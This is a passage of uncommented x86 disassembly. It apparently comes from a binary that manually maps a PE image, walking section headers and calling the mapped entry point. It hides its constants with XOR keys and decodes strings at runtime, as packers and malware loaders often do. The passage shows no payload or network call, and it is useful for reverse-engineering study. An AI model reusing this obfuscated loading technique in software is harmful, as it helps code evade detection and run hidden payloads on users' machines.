  426c7b:	movzx  edx,WORD PTR [eax+0x6]
  426c7f:	xor    ecx,esi
  426c81:	add    ecx,edi
  426c83:	mov    DWORD PTR [ebp+0xc],eax
  426c86:	cmp    edx,ecx
  426c88:	je     0x426d35
  426c8e:	mov    ecx,DWORD PTR [ebp-0x4]
  426c91:	xor    ecx,esi
  426c93:	add    ecx,edi
  426c95:	mov    DWORD PTR [ebp-0x8],ecx
  426c98:	mov    ecx,DWORD PTR [ebp-0x24]
  426c9b:	movzx  edx,WORD PTR [eax+0x6]
  426c9f:	xor    ecx,esi
  426ca1:	sub    edx,ecx
  426ca3:	sub    edx,edi
  426ca5:	cmp    DWORD PTR [ebp-0x8],edx
  426ca8:	ja     0x426d35
  426cae:	mov    edx,DWORD PTR [ebp+0x18]
  426cb1:	add    edx,0x8
  426cb4:	mov    DWORD PTR [ebp+0x18],edx
  426cb7:	jmp    0x426cbc
  426cb9:	mov    edx,DWORD PTR [ebp+0x18]
  426cbc:	mov    eax,DWORD PTR [eax+0x38]
  426cbf:	lea    ecx,[eax-0x1]
  426cc2:	mov    DWORD PTR [ebp-0x38],eax
  426cc5:	mov    eax,DWORD PTR [edx]
  426cc7:	test   eax,ecx
  426cc9:	je     0x426cd2
  426ccb:	not    ecx
  426ccd:	and    eax,ecx
  426ccf:	add    eax,DWORD PTR [ebp-0x38]
  426cd2:	mov    ecx,DWORD PTR [edx+0x4]
  426cd5:	add    ecx,DWORD PTR [ebp+0x20]
  426cd8:	push   ecx
  426cd9:	call   0x4275b5
  426cde:	mov    edx,DWORD PTR [ebp-0x4]
  426ce1:	mov    eax,DWORD PTR [ebp+0x18]
  426ce4:	mov    ecx,DWORD PTR [eax+0x8]
  426ce7:	xor    edx,esi
  426ce9:	add    edx,edi
  426ceb:	cmp    ecx,edx
  426ced:	je     0x426d06
  426cef:	push   ecx
  426cf0:	mov    ecx,DWORD PTR [ebp+0x8]
  426cf3:	add    ecx,DWORD PTR [eax+0xc]
  426cf6:	mov    eax,DWORD PTR [eax+0x4]
  426cf9:	add    eax,DWORD PTR [ebp+0x20]
  426cfc:	push   ecx
  426cfd:	push   eax
  426cfe:	call   0x4274ab
  426d03:	mov    eax,DWORD PTR [ebp+0x18]
  426d06:	mov    ecx,DWORD PTR [ebp-0x24]
  426d09:	mov    edx,DWORD PTR [ebp-0x8]
  426d0c:	add    eax,0x28
  426d0f:	xor    ecx,esi
  426d11:	lea    ecx,[edx+ecx*1+0x3272ec]
  426d18:	mov    edx,DWORD PTR [ebp+0xc]
  426d1b:	mov    DWORD PTR [ebp+0x18],eax
  426d1e:	mov    eax,DWORD PTR [ebp-0x24]
  426d21:	movzx  edx,WORD PTR [edx+0x6]
  426d25:	xor    eax,esi
  426d27:	sub    edx,eax
  426d29:	mov    eax,DWORD PTR [ebp+0xc]
  426d2c:	sub    edx,edi
  426d2e:	mov    DWORD PTR [ebp-0x8],ecx
  426d31:	cmp    ecx,edx
  426d33:	jbe    0x426cb9
  426d35:	mov    edx,DWORD PTR [ebx+0x18c]
  426d3b:	mov    ecx,DWORD PTR [ebp+0x20]
  426d3e:	cmp    ecx,DWORD PTR [edx]
  426d40:	jne    0x426d69
  426d42:	mov    eax,DWORD PTR [ebx+0x1d8]
  426d48:	lea    edx,[ebp-0x18]
  426d4b:	push   edx
  426d4c:	mov    edx,DWORD PTR [ebp-0x10]
  426d4f:	xor    edx,esi
  426d51:	add    edx,edi
  426d53:	push   edx
  426d54:	mov    edx,DWORD PTR [ebp-0x20]
  426d57:	push   DWORD PTR [edx+0x54]
  426d5a:	push   ecx
  426d5b:	call   DWORD PTR [eax+0x1c]
  426d5e:	test   eax,eax
  426d60:	je     0x427009
  426d66:	mov    eax,DWORD PTR [ebp+0xc]
  426d69:	mov    ecx,DWORD PTR [ebx+0x1c8]
  426d6f:	mov    ecx,DWORD PTR [ecx]
  426d71:	xor    ecx,esi
  426d73:	add    ecx,edi
  426d75:	je     0x426f34
  426d7b:	mov    eax,DWORD PTR [ebp-0x4]
  426d7e:	xor    eax,esi
  426d80:	add    eax,edi
  426d82:	and    DWORD PTR [ebp+0x8],0x0
  426d86:	mov    DWORD PTR [ebp-0x14],eax
  426d89:	mov    ecx,0xf89c8524
  426d8e:	mov    eax,0xf89c85dc
  426d93:	mov    DWORD PTR [ebp-0x58],0xf89c8526
  426d9a:	mov    DWORD PTR [ebp-0x54],0xf89c852c
  426da1:	mov    DWORD PTR [ebp-0x50],eax
  426da4:	mov    DWORD PTR [ebp-0x4c],ecx
  426da7:	mov    DWORD PTR [ebp-0x48],ecx
  426daa:	mov    DWORD PTR [ebp-0x44],0xf89c85b0
  426db1:	mov    edx,DWORD PTR [ebp+0x8]
  426db4:	mov    ecx,0x8a4
  426db9:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  426dbe:	mov    edx,0x72ec
  426dc3:	add    cx,dx
  426dc6:	mov    edx,DWORD PTR [ebp+0x8]
  426dc9:	inc    DWORD PTR [ebp+0x8]
  426dcc:	cmp    DWORD PTR [ebp+0x8],0x6
  426dd0:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  426dd8:	jb     0x426db1
  426dda:	mov    ecx,0xf89c8522
  426ddf:	mov    DWORD PTR [ebp-0xb0],eax
  426de5:	mov    DWORD PTR [ebp-0x9c],eax
  426deb:	mov    DWORD PTR [ebp-0x74],eax
  426dee:	mov    DWORD PTR [ebp-0x70],eax
  426df1:	lea    eax,[ecx+0x1]
  426df4:	mov    edx,0xf89c85fe
  426df9:	mov    DWORD PTR [ebp-0x64],eax
  426dfc:	mov    DWORD PTR [ebp-0x60],eax
  426dff:	mov    DWORD PTR [ebp-0xb4],0xf89c85c4
  426e09:	mov    DWORD PTR [ebp-0xac],ecx
  426e0f:	mov    DWORD PTR [ebp-0xa8],edx
  426e15:	mov    DWORD PTR [ebp-0xa4],0xf89c85d9
  426e1f:	mov    DWORD PTR [ebp-0xa0],0xf89c8526
  426e29:	mov    DWORD PTR [ebp-0x98],0xf89c85fd
  426e33:	mov    DWORD PTR [ebp-0x94],0xf89c8526
  426e3d:	mov    DWORD PTR [ebp-0x90],0xf89c852c
  426e47:	mov    DWORD PTR [ebp-0x8c],ecx
  426e4d:	mov    DWORD PTR [ebp-0x88],0xf89c8529
  426e57:	mov    DWORD PTR [ebp-0x84],edx
  426e5d:	mov    DWORD PTR [ebp-0x80],0xf89c8527
  426e64:	mov    DWORD PTR [ebp-0x7c],ecx
  426e67:	mov    DWORD PTR [ebp-0x78],0xf89c85f1
  426e6e:	mov    DWORD PTR [ebp-0x6c],ecx
  426e71:	mov    DWORD PTR [ebp-0x68],0xf89c85dd
  426e78:	mov    DWORD PTR [ebp-0x5c],0xf89c85b0
  426e7f:	xor    eax,eax
  426e81:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  426e88:	xor    cl,0xa4
  426e8b:	sub    cl,0x14
  426e8e:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  426e95:	inc    eax
  426e96:	cmp    eax,0x17
  426e99:	jb     0x426e81
  426e9b:	mov    eax,DWORD PTR [ebx+0x1d8]
  426ea1:	lea    ecx,[ebp-0xc0]
  426ea7:	push   ecx
  426ea8:	call   DWORD PTR [eax+0x4]
  426eab:	mov    ecx,DWORD PTR [ebx+0x1d8]
  426eb1:	lea    edx,[ebp-0xd8]
  426eb7:	push   edx
  426eb8:	push   eax
  426eb9:	call   DWORD PTR [ecx+0x8]
  426ebc:	mov    DWORD PTR [ebp-0x40],eax
  426ebf:	lea    eax,[ebp-0x14]
  426ec2:	push   eax
  426ec3:	mov    eax,DWORD PTR [ebx+0x18c]
  426ec9:	push   DWORD PTR [eax]
  426ecb:	mov    eax,DWORD PTR [ebp-0x40]
  426ece:	call   eax
  426ed0:	mov    eax,DWORD PTR [ebp-0x4]
  426ed3:	xor    eax,esi
  426ed5:	add    eax,edi
  426ed7:	mov    DWORD PTR [ebp-0x34],eax
  426eda:	mov    ecx,DWORD PTR [ebp-0x4]
  426edd:	mov    eax,DWORD PTR [ebp-0x14]
  426ee0:	xor    ecx,esi
  426ee2:	add    ecx,edi
  426ee4:	cmp    eax,ecx
  426ee6:	je     0x426f31
  426ee8:	mov    DWORD PTR [ebp-0x3c],eax
  426eeb:	jmp    0x426efc
  426eed:	mov    eax,DWORD PTR [eax]
  426eef:	mov    ecx,DWORD PTR [ebp-0x3c]
  426ef2:	mov    DWORD PTR [ebp-0x14],eax
  426ef5:	mov    eax,DWORD PTR [ebp-0x14]
  426ef8:	cmp    eax,ecx
  426efa:	je     0x426f09
  426efc:	mov    edx,DWORD PTR [eax+0x18]
  426eff:	mov    ecx,DWORD PTR [ebx+0x18c]
  426f05:	cmp    edx,DWORD PTR [ecx]
  426f07:	jne    0x426eed
  426f09:	mov    ecx,DWORD PTR [ebx+0x18c]
  426f0f:	mov    edx,DWORD PTR [eax+0x18]
  426f12:	cmp    edx,DWORD PTR [ecx]
  426f14:	jne    0x426f31
  426f16:	mov    ecx,DWORD PTR [ebx+0x190]
  426f1c:	mov    edx,DWORD PTR [ebp-0x20]
  426f1f:	mov    edx,DWORD PTR [edx+0x28]
  426f22:	add    edx,DWORD PTR [ecx]
  426f24:	mov    DWORD PTR [eax+0x1c],edx
  426f27:	mov    eax,DWORD PTR [ebp-0x24]
  426f2a:	xor    eax,esi
  426f2c:	add    eax,edi
  426f2e:	mov    DWORD PTR [ebp-0x34],eax
  426f31:	mov    eax,DWORD PTR [ebp+0xc]
  426f34:	push   ebx
  426f35:	push   eax
  426f36:	push   DWORD PTR [ebp+0x20]
  426f39:	call   0x4266b5
  426f3e:	test   eax,eax
  426f40:	je     0x427009
  426f46:	push   DWORD PTR [ebp+0xc]
  426f49:	mov    ecx,ebx
  426f4b:	push   DWORD PTR [ebp+0x20]
  426f4e:	call   0x42660e
  426f53:	test   eax,eax
  426f55:	je     0x427009
  426f5b:	mov    eax,DWORD PTR [ebp+0xc]
  426f5e:	mov    edx,DWORD PTR [ebp+0x20]
  426f61:	mov    ecx,ebx
  426f63:	call   0x4264e7
  426f68:	test   eax,eax
  426f6a:	je     0x427009
  426f70:	push   ebx
  426f71:	push   DWORD PTR [ebp+0x20]
  426f74:	call   0x426998
  426f79:	test   eax,eax
  426f7b:	je     0x427009
  426f81:	mov    eax,DWORD PTR [ebx+0x18c]
  426f87:	mov    edx,DWORD PTR [ebp+0x20]
  426f8a:	cmp    edx,DWORD PTR [eax]
  426f8c:	jne    0x426fa8
  426f8e:	mov    eax,DWORD PTR [ebx+0x1d8]
  426f94:	lea    ecx,[ebp-0x18]
  426f97:	push   ecx
  426f98:	push   DWORD PTR [ebp-0x18]
  426f9b:	mov    ecx,DWORD PTR [ebp-0x20]
  426f9e:	push   DWORD PTR [ecx+0x54]
  426fa1:	push   edx
  426fa2:	call   DWORD PTR [eax+0x1c]
  426fa5:	mov    edx,DWORD PTR [ebp+0x20]
  426fa8:	mov    eax,DWORD PTR [ebx+0x1c8]
  426fae:	mov    eax,DWORD PTR [eax]
  426fb0:	xor    eax,esi
  426fb2:	add    eax,edi
  426fb4:	je     0x426fed
  426fb6:	mov    ecx,DWORD PTR [ebp+0xc]
  426fb9:	mov    eax,DWORD PTR [ecx+0x28]
  426fbc:	mov    DWORD PTR [ebp+0x8],0xf89ca5b0
  426fc3:	mov    esi,DWORD PTR [ebp+0x8]
  426fc6:	push   DWORD PTR [ebp+0x14]
  426fc9:	xor    esi,0x8a4
  426fcf:	push   DWORD PTR [ebp+0x10]
  426fd2:	add    esi,0x72ec
  426fd8:	or     WORD PTR [ecx+0x16],si
  426fdc:	add    eax,edx
  426fde:	push   edx
  426fdf:	call   eax
  426fe1:	mov    DWORD PTR [ebx+0x1d0],0xf89c85b1
  426feb:	jmp    0x426ff7
  426fed:	mov    eax,DWORD PTR [ebp+0xc]
  426ff0:	mov    eax,DWORD PTR [eax+0x28]
  426ff3:	add    eax,edx
  426ff5:	call   eax
  426ff7:	mov    DWORD PTR [ebp-0x8],eax
  426ffa:	mov    eax,DWORD PTR [ebp-0x8]
  426ffd:	mov    ecx,DWORD PTR [ebp+0x1c]
  427000:	mov    DWORD PTR [ecx],eax
  427002:	mov    DWORD PTR [ebp-0x30],0x1
  427009:	cmp    DWORD PTR [ebp-0x30],0x0
  42700d:	jne    0x427013
  42700f:	and    DWORD PTR [ebp+0x20],0x0
  427013:	mov    eax,DWORD PTR [ebp+0x20]
  427016:	jmp    0x42701a
  427018:	xor    eax,eax
  42701a:	pop    edi
  42701b:	pop    esi
  42701c:	pop    ebx
  42701d:	leave  
  42701e:	ret    0x1c
  427021:	push   ebp
  427022:	mov    ebp,esp
  427024:	movzx  edx,WORD PTR [ecx+0x6]
  427028:	movzx  eax,WORD PTR [ecx+0x14]
  42702c:	push   ebx
  42702d:	push   edi
  42702e:	xor    edi,edi
  427030:	lea    eax,[eax+ecx*1+0x18]
  427034:	test   edx,edx
  427036:	je     0x427057
  427038:	mov    ecx,DWORD PTR [eax+0xc]
  42703b:	lea    ebx,[ecx+esi*1]
  42703e:	cmp    DWORD PTR [ebp+0x8],ebx
  427041:	jb     0x42704f
  427043:	mov    ebx,DWORD PTR [eax+0x8]
  427046:	add    ebx,ecx
  427048:	add    ebx,esi
  42704a:	cmp    DWORD PTR [ebp+0x8],ebx
  42704d:	jb     0x427059
  42704f:	add    eax,0x28
  427052:	inc    edi
  427053:	cmp    edi,edx
  427055:	jb     0x427038
  427057:	xor    eax,eax
  427059:	pop    edi
  42705a:	pop    ebx
  42705b:	pop    ebp
  42705c:	ret    0x4
  42705f:	push   ebp
  427060:	mov    ebp,esp
  427062:	sub    esp,0x34
  427065:	mov    DWORD PTR [ebp-0xc],0xf89c85b0
  42706c:	mov    DWORD PTR [ebp-0x18],0xf89c85b1
  427073:	mov    DWORD PTR [ebp-0x1c],0xf89c85b2
  42707a:	mov    DWORD PTR [ebp-0x8],0xf89c85d1
  427081:	mov    DWORD PTR [ebp-0x20],0xf89c85f1
  427088:	mov    DWORD PTR [ebp-0x2c],0xf89c852a
  42708f:	mov    DWORD PTR [ebp-0x2c],0xf89c85ca
  427096:	mov    DWORD PTR [ebp-0x10],eax
  427099:	mov    eax,DWORD PTR [ebp+0x8]
  42709c:	mov    DWORD PTR [ebp-0x14],eax
  42709f:	mov    eax,DWORD PTR [ebp-0xc]
  4270a2:	push   ebx
  4270a3:	mov    ecx,0x75108a4
  4270a8:	xor    eax,ecx
  4270aa:	push   esi
  4270ab:	mov    esi,DWORD PTR [ebp-0x10]
  4270ae:	mov    edx,0x3272ec
  4270b3:	add    eax,edx
  4270b5:	push   edi
  4270b6:	cmp    esi,eax
  4270b8:	je     0x427297
  4270be:	mov    eax,DWORD PTR [ebp-0xc]
  4270c1:	mov    esi,DWORD PTR [ebp-0x14]
  4270c4:	xor    eax,ecx
  4270c6:	add    eax,edx
  4270c8:	cmp    esi,eax
  4270ca:	je     0x427297
  4270d0:	mov    eax,DWORD PTR [ebp-0xc]
  4270d3:	xor    eax,ecx
  4270d5:	add    eax,edx
  4270d7:	mov    DWORD PTR [ebp-0x24],eax
  4270da:	mov    eax,DWORD PTR [ebp-0xc]
  4270dd:	xor    eax,ecx
  4270df:	add    eax,edx
  4270e1:	mov    DWORD PTR [ebp-0x28],eax
  4270e4:	mov    edi,DWORD PTR [ebp-0x20]
  4270e7:	mov    ebx,DWORD PTR [ebp-0x8]
  4270ea:	mov    esi,0x8a4
  4270ef:	xor    edi,esi
  4270f1:	mov    eax,0x72ec
  4270f6:	xor    ebx,esi
  4270f8:	add    edi,eax
  4270fa:	add    ebx,eax
  4270fc:	sub    ebx,edi
  4270fe:	mov    WORD PTR [ebp-0x8],bx
  427102:	jmp    0x4271c7
  427107:	mov    edi,DWORD PTR [ebp-0xc]
  42710a:	mov    bx,WORD PTR [ebp-0x4]
  42710e:	xor    edi,esi
  427110:	add    edi,eax
  427112:	cmp    bx,di
  427115:	je     0x427209
  42711b:	mov    edi,DWORD PTR [ebp-0xc]
  42711e:	mov    ebx,DWORD PTR [ebp+0xc]
  427121:	xor    edi,ecx
  427123:	add    edi,edx
  427125:	cmp    ebx,edi
  427127:	mov    di,WORD PTR [ebp-0x4]
  42712b:	mov    bx,WORD PTR [ebp+0x8]
  42712f:	je     0x42719a
  427131:	cmp    bx,di
  427134:	je     0x4271a3
  427136:	mov    edi,DWORD PTR [ebp-0x20]
  427139:	mov    bx,WORD PTR [ebp+0x8]
  42713d:	xor    edi,esi
  42713f:	add    edi,eax
  427141:	cmp    bx,di
  427144:	jb     0x427164
  427146:	mov    edi,DWORD PTR [ebp-0x2c]
  427149:	mov    bx,WORD PTR [ebp+0x8]
  42714d:	xor    edi,esi
  42714f:	add    edi,eax
  427151:	cmp    bx,di
  427154:	ja     0x427164
  427156:	movzx  edi,WORD PTR [ebp+0x8]
  42715a:	movzx  ebx,WORD PTR [ebp-0x8]
  42715e:	add    edi,ebx
  427160:	mov    WORD PTR [ebp+0x8],di
  427164:	mov    edi,DWORD PTR [ebp-0x20]
  427167:	mov    bx,WORD PTR [ebp-0x4]
  42716b:	xor    edi,esi
  42716d:	add    edi,eax
  42716f:	cmp    bx,di
  427172:	jb     0x427192
  427174:	mov    edi,DWORD PTR [ebp-0x2c]
  427177:	mov    bx,WORD PTR [ebp-0x4]
  42717b:	xor    edi,esi
  42717d:	add    edi,eax
  42717f:	cmp    bx,di
  427182:	ja     0x427192
  427184:	movzx  edi,WORD PTR [ebp-0x4]
  427188:	movzx  ebx,WORD PTR [ebp-0x8]
  42718c:	add    edi,ebx
  42718e:	mov    WORD PTR [ebp-0x4],di
  427192:	mov    di,WORD PTR [ebp-0x4]
  427196:	mov    bx,WORD PTR [ebp+0x8]
  42719a:	cmp    bx,di
  42719d:	jne    0x427297
  4271a3:	mov    edi,DWORD PTR [ebp-0x1c]
  4271a6:	mov    ebx,DWORD PTR [ebp-0x10]
  4271a9:	xor    edi,ecx
  4271ab:	lea    edi,[edi+ebx*1+0x3272ec]
  4271b2:	mov    DWORD PTR [ebp-0x10],edi
  4271b5:	mov    edi,DWORD PTR [ebp-0x1c]
  4271b8:	mov    ebx,DWORD PTR [ebp-0x14]
  4271bb:	xor    edi,ecx
  4271bd:	lea    edi,[edi+ebx*1+0x3272ec]
  4271c4:	mov    DWORD PTR [ebp-0x14],edi
  4271c7:	mov    edi,DWORD PTR [ebp-0x24]
  4271ca:	mov    ebx,DWORD PTR [ebp-0x10]
  4271cd:	mov    di,WORD PTR [ebx+edi*2]
  4271d1:	mov    WORD PTR [ebp+0x8],di
  4271d5:	mov    edi,DWORD PTR [ebp-0x28]
  4271d8:	mov    ebx,DWORD PTR [ebp-0x14]
  4271db:	mov    di,WORD PTR [ebx+edi*2]
  4271df:	mov    WORD PTR [ebp-0x4],di
  4271e3:	mov    edi,DWORD PTR [ebp-0xc]
  4271e6:	mov    bx,WORD PTR [ebp+0x8]
  4271ea:	xor    edi,esi
  4271ec:	add    edi,eax
  4271ee:	cmp    bx,di
  4271f1:	jne    0x427107
  4271f7:	mov    eax,DWORD PTR [ebp-0x18]
  4271fa:	mov    esi,DWORD PTR [ebp-0xc]
  4271fd:	xor    eax,ecx
  4271ff:	add    eax,edx
  427201:	imul   eax,esi
  427204:	mov    DWORD PTR [ebp-0xc],eax
  427207:	jmp    0x42721b
  427209:	mov    eax,DWORD PTR [ebp-0xc]
  42720c:	mov    esi,DWORD PTR [ebp-0x18]
  42720f:	xor    eax,ecx
  427211:	lea    eax,[eax+esi*1+0x3272ec]
  427218:	mov    DWORD PTR [ebp-0x18],eax
  42721b:	mov    eax,DWORD PTR [ebp-0x24]
  42721e:	sub    eax,edx
  427220:	xor    eax,ecx
  427222:	mov    DWORD PTR [ebp-0x30],eax
  427225:	mov    eax,DWORD PTR [ebp-0x28]
  427228:	sub    eax,edx
  42722a:	xor    eax,ecx
  42722c:	mov    DWORD PTR [ebp-0x34],eax
  42722f:	mov    eax,DWORD PTR [ebp-0x34]
  427232:	mov    esi,DWORD PTR [ebp-0x1c]
  427235:	xor    esi,ecx
  427237:	add    esi,edx
  427239:	xor    eax,ecx
  42723b:	add    eax,0x3272ec
  427240:	imul   esi,eax
  427243:	mov    eax,DWORD PTR [ebp-0x14]
  427246:	movzx  eax,WORD PTR [esi+eax*1]
  42724a:	mov    esi,DWORD PTR [ebp-0x30]
  42724d:	mov    edi,DWORD PTR [ebp-0x1c]
  427250:	xor    esi,ecx
  427252:	add    esi,edx
  427254:	xor    edi,ecx
  427256:	add    edi,edx
  427258:	imul   edi,esi
  42725b:	mov    esi,DWORD PTR [ebp-0x10]
  42725e:	movzx  esi,WORD PTR [edi+esi*1]
  427262:	sub    eax,edx
  427264:	sub    esi,edx
  427266:	xor    eax,ecx
  427268:	xor    esi,ecx
  42726a:	cmp    esi,eax
  42726c:	jne    0x427297
  42726e:	mov    eax,DWORD PTR [ebp-0x30]
  427271:	mov    esi,DWORD PTR [ebp-0x1c]
  427274:	xor    eax,ecx
  427276:	add    eax,0x3272ec
  42727b:	xor    esi,ecx
  42727d:	add    esi,edx
  42727f:	imul   esi,eax
  427282:	mov    eax,DWORD PTR [ebp-0x10]
  427285:	movzx  eax,WORD PTR [esi+eax*1]
  427289:	mov    esi,DWORD PTR [ebp-0xc]
  42728c:	sub    eax,edx
  42728e:	xor    eax,ecx
  427290:	cmp    eax,esi
  427292:	mov    eax,DWORD PTR [ebp-0xc]
  427295:	je     0x42729a
  427297:	mov    eax,DWORD PTR [ebp-0x18]
  42729a:	pop    edi
  42729b:	xor    eax,ecx
  42729d:	pop    esi
  42729e:	add    eax,edx
  4272a0:	pop    ebx
  4272a1:	leave  
  4272a2:	ret    0x8
  4272a5:	push   ebp
  4272a6:	mov    ebp,esp
  4272a8:	push   ecx
  4272a9:	mov    cx,WORD PTR [eax]
  4272ac:	push   esi
  4272ad:	mov    esi,0x3b56
  4272b2:	sub    cx,si
  4272b5:	mov    esi,0x8a94
  4272ba:	xor    cx,si
  4272bd:	mov    esi,0x4e3e
  4272c2:	mov    DWORD PTR [ebp-0x4],0xf89c85b7
  4272c9:	mov    edx,0xf89c85b0
  4272ce:	cmp    cx,si
  4272d1:	je     0x427330
  4272d3:	push   ebx
  4272d4:	push   edi
  4272d5:	movzx  ecx,cx
  4272d8:	mov    edi,0xffcd8d14
  4272dd:	mov    esi,0x75108a4
  4272e2:	mov    ebx,0x4f92
  4272e7:	cmp    cx,bx
  4272ea:	jne    0x4272ef
  4272ec:	mov    DWORD PTR [ebp-0x4],edx
  4272ef:	lea    edx,[edi+0x1]
  4272f2:	xor    edx,esi
  4272f4:	mov    edi,edx
  4272f6:	xor    edi,esi
  4272f8:	mov    cx,WORD PTR [eax+edi*2+0x64e5d8]
  427300:	mov    ebx,0x3b56
  427305:	sub    cx,bx
  427308:	mov    ebx,0x8a94
  42730d:	xor    cx,bx
  427310:	mov    ebx,0x4e3e
  427315:	cmp    cx,bx
  427318:	jne    0x4272e2
  42731a:	mov    ecx,DWORD PTR [ebp-0x4]
  42731d:	pop    edi
  42731e:	pop    ebx
  42731f:	cmp    ecx,0xf89c85b7
  427325:	je     0x427330
  427327:	xor    ecx,esi
  427329:	lea    eax,[eax+ecx*2+0x64e5da]
  427330:	pop    esi
  427331:	leave  
  427332:	ret    
  427333:	push   ebp
  427334:	mov    ebp,esp
  427336:	push   ecx
  427337:	push   esi
  427338:	push   edi
  427339:	mov    DWORD PTR [ebp-0x4],0xf89c85b7
  427340:	mov    esi,0xf89c85b0
  427345:	call   0x4272a5
  42734a:	mov    edi,eax
  42734c:	mov    al,BYTE PTR [edi]
  42734e:	add    al,0x3
  427350:	xor    al,0x79
  427352:	cmp    al,0x7a
  427354:	je     0x4273b7
  427356:	mov    eax,edi
  427358:	mov    edx,0xffcd8d14
  42735d:	mov    ecx,0x75108a4
  427362:	push   ebx
  427363:	mov    ax,WORD PTR [eax]
  427366:	mov    ebx,0x3b56
  42736b:	sub    ax,bx
  42736e:	mov    ebx,0x8a94
  427373:	xor    ax,bx
  427376:	mov    ebx,0x4e4c
  42737b:	cmp    ax,bx
  42737e:	jne    0x427383
  427380:	mov    DWORD PTR [ebp-0x4],esi
  427383:	lea    esi,[edx+0x1]
  427386:	xor    esi,ecx
  427388:	mov    edx,esi
  42738a:	xor    edx,ecx
  42738c:	lea    eax,[edi+edx*2+0x64e5d8]
  427393:	mov    bl,BYTE PTR [eax]
  427395:	add    bl,0x3
  427398:	xor    bl,0x79
  42739b:	cmp    bl,0x7a
  42739e:	jne    0x427363
  4273a0:	mov    eax,DWORD PTR [ebp-0x4]
  4273a3:	pop    ebx
  4273a4:	cmp    eax,0xf89c85b7
  4273a9:	je     0x4273b7
  4273ab:	xor    eax,ecx
  4273ad:	xor    ecx,ecx
  4273af:	mov    WORD PTR [edi+eax*2+0x64e5d8],cx
  4273b7:	mov    eax,edi
  4273b9:	pop    edi
  4273ba:	pop    esi
  4273bb:	leave  
  4273bc:	ret    
  4273bd:	push   ebp
  4273be:	mov    ebp,esp
  4273c0:	push   ecx
  4273c1:	push   esi
  4273c2:	mov    DWORD PTR [ebp-0x4],0xf89c85b7
  4273c9:	mov    esi,0xf89c85b0
  4273ce:	call   0x4272a5
  4273d3:	mov    cx,WORD PTR [eax]
  4273d6:	mov    edx,0x3b56
  4273db:	sub    cx,dx
  4273de:	mov    edx,0x8a94
  4273e3:	xor    cx,dx
  4273e6:	mov    edx,0x4e3e
  4273eb:	cmp    cx,dx
  4273ee:	je     0x427447
  4273f0:	push   ebx
  4273f1:	push   edi
  4273f2:	movzx  ecx,cx
  4273f5:	mov    edx,0xffcd8d14
  4273fa:	mov    edi,0x75108a4
  4273ff:	mov    ebx,0x4e4c
  427404:	cmp    cx,bx
  427407:	jne    0x42740c
  427409:	mov    DWORD PTR [ebp-0x4],esi
  42740c:	lea    esi,[edx+0x1]
  42740f:	xor    esi,edi
  427411:	mov    edx,esi
  427413:	xor    edx,edi
  427415:	mov    cx,WORD PTR [eax+edx*2+0x64e5d8]
  42741d:	mov    ebx,0x3b56
  427422:	sub    cx,bx
  427425:	mov    ebx,0x8a94
  42742a:	xor    cx,bx
  42742d:	mov    ebx,0x4e3e
  427432:	cmp    cx,bx
  427435:	jne    0x4273ff
  427437:	cmp    DWORD PTR [ebp-0x4],0xf89c85b7
  42743e:	pop    edi
  42743f:	pop    ebx
  427440:	je     0x427447
  427442:	xor    eax,eax
  427444:	inc    eax
  427445:	jmp    0x427449
  427447:	xor    eax,eax
  427449:	pop    esi
  42744a:	leave  
  42744b:	ret    
  42744c:	push   ebp
  42744d:	mov    ebp,esp
  42744f:	push   ecx
  427450:	mov    eax,DWORD PTR [ebp+0x8]
  427453:	movzx  ecx,WORD PTR [eax]
  427456:	push   esi
  427457:	lea    eax,[ecx-0x3b56]
  42745d:	mov    esi,0x8a94
  427462:	push   edi
  427463:	xor    eax,esi
  427465:	mov    edi,0x4e3e
  42746a:	mov    DWORD PTR [ebp-0x4],edx
  42746d:	cmp    ax,di
  427470:	je     0x42749d
  427472:	mov    eax,DWORD PTR [ebp+0x8]
  427475:	sub    eax,edx
  427477:	mov    DWORD PTR [ebp+0x8],eax
  42747a:	jmp    0x42747f
  42747c:	mov    eax,DWORD PTR [ebp+0x8]
  42747f:	mov    WORD PTR [edx],cx
  427482:	add    edx,0x2
  427485:	movzx  edi,WORD PTR [eax+edx*1]
  427489:	mov    ecx,edi
  42748b:	add    edi,0xffffc4aa
  427491:	xor    edi,esi
  427493:	mov    eax,0x4e3e
  427498:	cmp    di,ax
  42749b:	jne    0x42747c
  42749d:	xor    eax,eax
  42749f:	pop    edi
  4274a0:	mov    WORD PTR [edx],ax
  4274a3:	mov    eax,DWORD PTR [ebp-0x4]
  4274a6:	pop    esi
  4274a7:	leave  
  4274a8:	ret    0x4
  4274ab:	push   ebp
  4274ac:	mov    ebp,esp
  4274ae:	sub    esp,0x18
  4274b1:	mov    DWORD PTR [ebp-0x8],0xf89c85b0
  4274b8:	mov    DWORD PTR [ebp-0x18],0xf89c85b1
  4274bf:	mov    ecx,DWORD PTR [ebp-0x8]
  4274c2:	push   esi
  4274c3:	mov    eax,0x75108a4
  4274c8:	xor    ecx,eax
  4274ca:	mov    esi,0x3272ec
  4274cf:	add    ecx,esi
  4274d1:	mov    DWORD PTR [ebp-0x4],ecx
  4274d4:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  4274db:	mov    DWORD PTR [ebp-0x10],0xf89c85bc
  4274e2:	push   edi
  4274e3:	mov    DWORD PTR [ebp-0x14],0xf89c85b2
  4274ea:	jmp    0x42758b
  4274ef:	mov    ecx,DWORD PTR [ebp-0x4]
  4274f2:	mov    edx,DWORD PTR [ebp+0x10]
  4274f5:	sub    edx,ecx
  4274f7:	mov    ecx,DWORD PTR [ebp-0xc]
  4274fa:	xor    ecx,eax
  4274fc:	add    ecx,esi
  4274fe:	cmp    edx,ecx
  427500:	jbe    0x42751d
  427502:	mov    edx,DWORD PTR [ebp-0x4]
  427505:	add    edx,DWORD PTR [ebp+0x8]
  427508:	mov    ecx,DWORD PTR [ebp-0x4]
  42750b:	add    ecx,DWORD PTR [ebp+0xc]
  42750e:	mov    edi,DWORD PTR [ecx]
  427510:	mov    DWORD PTR [edx],edi
  427512:	mov    ecx,DWORD PTR [ecx+0x4]
  427515:	mov    DWORD PTR [edx+0x4],ecx
  427518:	mov    ecx,DWORD PTR [ebp-0xc]
  42751b:	jmp    0x42756a
  42751d:	mov    ecx,DWORD PTR [ebp-0x4]
  427520:	mov    edx,DWORD PTR [ebp+0x10]
  427523:	sub    edx,ecx
  427525:	mov    ecx,DWORD PTR [ebp-0x10]
  427528:	xor    ecx,eax
  42752a:	add    ecx,esi
  42752c:	cmp    edx,ecx
